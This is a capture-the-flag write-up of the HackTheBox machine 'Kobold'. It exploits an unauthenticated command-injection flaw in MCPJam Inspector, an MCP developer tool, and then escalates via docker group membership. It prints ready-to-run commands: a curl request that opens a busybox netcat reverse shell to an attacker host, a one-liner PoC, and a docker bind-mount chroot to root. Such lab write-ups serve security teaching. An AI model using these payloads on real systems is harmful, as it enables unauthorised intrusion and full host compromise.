---
title: "Kobold"
difficulty: Easy
os: Linux
points: 20
rating: 3.8
date: 2026-03-21
avatar: assets/htb/kobold.png
tags: [mcp, ai, cve-2026-23744, rce, docker-escape, busybox]
htb_url: https://app.hackthebox.com/machines/Kobold
---

## Summary

Kobold is an easy Linux box built around **MCPJam Inspector v1.4.2**, a developer tool for testing Model Context Protocol (MCP) servers. The `/api/mcp/connect` endpoint passes the `command` field directly into Node.js `child_process.spawn()` with no authentication or sanitisation (**CVE-2026-23744**), giving me unauthenticated RCE. That lands an initial shell as user `ben`. From there I escalate by abusing a dormant `docker` group membership: `newgrp docker` activates it, and a container with the host root filesystem bind-mounted gives me full root.

## Enumeration

A full port scan with service detection shows only SSH and a web service, with HTTP fronting MCPJam Inspector v1.4.2:

```bash
nmap -p- --min-rate=10000 -sV -sC kobold.htb
# 22/tcp  ssh
# 80/tcp  http -> MCPJam Inspector v1.4.2
```

The MCPJam Inspector banner is the key finding. This AI dev tooling is designed for a "trusted local environment" and was never meant to be exposed to the network, which immediately makes the MCP server connection API the most promising target.

## Foothold

The vulnerability (CVE-2026-23744) sits in the API endpoint that connects to MCP servers. The request body is parsed and `command` is passed straight to `child_process.spawn(command, args)` with no auth and no allowlist. I register a malicious MCP server whose command spawns a busybox reverse shell:

```bash
curl -s -X POST http://kobold.htb/api/mcp/connect \
  -H 'Content-Type: application/json' \
  -d @- <<'JSON'
{
  "name": "pwn",
  "command": "busybox",
  "args": ["sh", "-c", "busybox nc <ATTACKER> 4444 -e /bin/sh"]
}
JSON
```

My listener catches the shell as `ben`:

```bash
nc -lvnp 4444
# whoami -> ben
```

The whole thing collapses into a single PoC one-liner:

```bash
TARGET=kobold.htb; LHOST=10.10.14.5; LPORT=4444; \
curl -s -X POST http://$TARGET/api/mcp/connect \
  -H 'Content-Type: application/json' \
  -d "{\"name\":\"x\",\"command\":\"busybox\",\"args\":[\"sh\",\"-c\",\"busybox nc $LHOST $LPORT -e /bin/sh\"]}"
```

## Privilege Escalation

Checking my identity, the spawned shell reports only the primary group:

```bash
id
# uid=1000(ben) gid=1000(ben) groups=1000(ben)
```

Supplementary groups are not yet active in the spawned shell, so I inspect `/etc/group` directly and find `ben` is actually a member of `docker`:

```bash
grep docker /etc/group
# docker:x:998:ben
```

The `docker` group is root-equivalent, but I need to re-evaluate `/etc/group` to actually pick it up. `newgrp docker` starts a new shell with the supplementary group loaded:

```bash
newgrp docker
id
# uid=1000(ben) ... groups=1000(ben),998(docker)
```

With the `docker` group active, I escape to root using the canonical bind-mount move: run a container with the host root filesystem mapped in, then `chroot` into it. No kernel exploit, no breakout magic, just `-v /:/host`:

```bash
docker run -v /:/host --rm -it alpine chroot /host bash
# whoami -> root
cat /root/root.txt
```
